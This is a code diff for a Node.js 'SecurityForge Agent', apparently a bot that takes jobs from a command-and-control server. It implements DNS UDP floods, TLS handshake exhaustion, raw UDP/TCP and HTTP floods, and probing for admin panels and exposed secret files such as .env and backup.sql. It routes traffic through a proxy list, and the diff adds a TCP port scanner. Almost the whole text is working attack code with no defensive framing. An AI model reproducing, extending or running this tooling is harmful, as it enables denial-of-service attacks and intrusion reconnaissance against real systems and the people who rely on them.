@@ -1,8 +1,8 @@
 /**
- * SECURITYFORGE AGENT V15.0 (FORTRESS BREAKER)
+ * SECURITYFORGE AGENT V15.1 (RESTORED)
  * - V13 Core: Dynamic Memory Scaling
  * - V14 Shadow Ops: DNS Reaper, Admin Hunter
- * - V15 Fortress: Login Siege, SSL Storm
+ * - V15 Fortress: Login Siege, SSL Storm, Port Scanner (NEW)
  */
 const https = require('https');
 const http = require('http');
@@ -23,11 +23,12 @@ const PROXY_LIST = [
     '117.251.103.186:8080', '43.205.118.158:80', '167.172.109.12:3128', '20.210.113.32:8123'
 ];
 const ADMIN_PATHS = ['/admin', '/login', '/wp-admin', '/dashboard', '/.env', '/config.php', '/backup.sql', '/api/v1/users', '/root', '/panel'];
+const TOP_PORTS = [21, 22, 23, 25, 53, 80, 110, 143, 443, 465, 587, 993, 995, 3306, 3389, 5432, 6379, 8080, 8443];
 const JUNK_DATA_SMALL = Buffer.alloc(1024 * 1, 'x');  
 
 // --- KEEPALIVE SERVER ---
 const PORT = process.env.PORT || 3000;
-http.createServer((req, res) => { res.writeHead(200); res.end('SecurityForge Agent V15.0 ACTIVE'); })
+http.createServer((req, res) => { res.writeHead(200); res.end('SecurityForge Agent V15.1 ACTIVE'); })
     .listen(PORT, () => console.log(`[SYSTEM] Agent listening on port ${PORT}`));
 
 // --- HELPER: NATIVE SUPABASE ---
@@ -66,13 +67,12 @@ const supabaseRequest = (method, pathStr, body = null) => {
     });
 };
 
-console.log('\x1b[35m[AGENT] Initialized V15.0 (Fortress Breaker). Polling C2...\x1b[0m');
+console.log('\x1b[35m[AGENT] Initialized V15.1 (Restored). Polling C2...\x1b[0m');
 
 let activeJob = null;
 let activeLoop = null;
 
 // --- DYNAMIC SCALING (AUTO-MEM) ---
-// Render free tier has 512MB. We target 400MB usage to be safe.
 const MAX_RAM_BYTES = 400 * 1024 * 1024; 
 const checkMemory = () => {
     const used = process.memoryUsage().heapUsed;
@@ -93,9 +93,9 @@ const startAttack = (job) => {
     let jobReqsForLatency = 0;
     let jobMaxLatency = 0;
     
-    // --- MODULE: SHADOW OPS (V14) ---
+    // --- MODULE: SHADOW OPS & RECON ---
     if (job.use_dns_reaper) {
-        // DNS Reaper: UDP Flood 53
+        // DNS Reaper
         const [host, portStr] = job.target.split(':');
         const port = 53;
         const flood = () => {
@@ -103,7 +103,7 @@ const startAttack = (job) => {
              if (!checkMemory()) return setTimeout(flood, 100);
              try {
                 const client = dgram.createSocket('udp4');
-                const buf = Buffer.from('aa00010000010000000000000377777706676f6f676c6503636f6d0000010001', 'hex'); // Malformed Query
+                const buf = Buffer.from('aa00010000010000000000000377777706676f6f676c6503636f6d0000010001', 'hex'); 
                 client.send(buf, port, host, (err) => { client.close(); totalRequests++; });
              } catch(e) {}
              if (running) setImmediate(flood);
@@ -111,7 +111,7 @@ const startAttack = (job) => {
         for(let i=0; i<Math.min(job.concurrency, 300); i++) flood();
     }
     else if (job.use_admin_hunter) {
-        // Admin Hunter: Path Fuzzer
+        // Admin Hunter
         let targetUrl; try { targetUrl = new URL(job.target); } catch(e) { return; }
         const scan = (pathIndex) => {
             if (!running) return;
@@ -127,9 +127,29 @@ const startAttack = (job) => {
         };
         for(let i=0; i<20; i++) scan(i);
     }
-    // --- MODULE: FORTRESS BREAKER (V15) ---
+    else if (job.use_port_scan) {
+        // TCP Port Scanner (V15.1)
+        let targetHost = job.target.replace('http://', '').replace('https://', '').split('/')[0].split(':')[0];
+        const scanPort = (idx) => {
+            if (!running) return;
+            const port = TOP_PORTS[idx % TOP_PORTS.length];
+            const socket = new net.Socket();
+            socket.setTimeout(200);
+            socket.on('connect', () => {
+                console.log(`\x1b[32m[OPEN] Port ${port} is OPEN on ${targetHost}\x1b[0m`);
+                jobSuccess++; totalRequests++; socket.destroy();
+            });
+            socket.on('timeout', () => { socket.destroy(); totalRequests++; });
+            socket.on('error', () => { totalRequests++; });
+            socket.connect(port, targetHost);
+            
+            if (running) setTimeout(() => scanPort(idx + 1), 50);
+        }
+        for(let i=0; i<50; i++) scanPort(i);
+    }
+    
+    // --- MODULE: FORTRESS BREAKER ---
     else if (job.use_ssl_storm) {
-        // SSL Storm: TLS Handshake Exhaustion
         let targetUrl; try { targetUrl = new URL(job.target); } catch(e) { return; }
         const host = targetUrl.hostname;
         const storm = () => {
@@ -137,7 +157,6 @@ const startAttack = (job) => {
             if (!checkMemory()) return setTimeout(storm, 100);
             try {
                 const socket = tls.connect(443, host, { rejectUnauthorized: false }, () => {
-                     // Handshake done, destroy immediately
                      socket.destroy();
                      jobSuccess++; totalRequests++;
                 });
@@ -147,7 +166,7 @@ const startAttack = (job) => {
         };
         for(let i=0; i<Math.min(job.concurrency, 400); i++) storm();
     }
-    // --- MODULE: NETJAM (UDP/TCP) ---
+    // --- MODULE: NETJAM ---
     else if (job.method === 'UDP' || job.method === 'TCP') {
         const [host, portStr] = job.target.split(':');
         const port = parseInt(portStr) || 80;
@@ -172,7 +191,7 @@ const startAttack = (job) => {
         };
         for(let i=0; i<Math.min(job.concurrency, 500); i++) flood(); 
     } 
-    // --- MODULE: STRESSFORGE (HTTP/HTTPS) ---
+    // --- MODULE: STRESSFORGE ---
     else {
         let targetUrl;
         try { targetUrl = new URL(job.target); } catch(e) { return; }
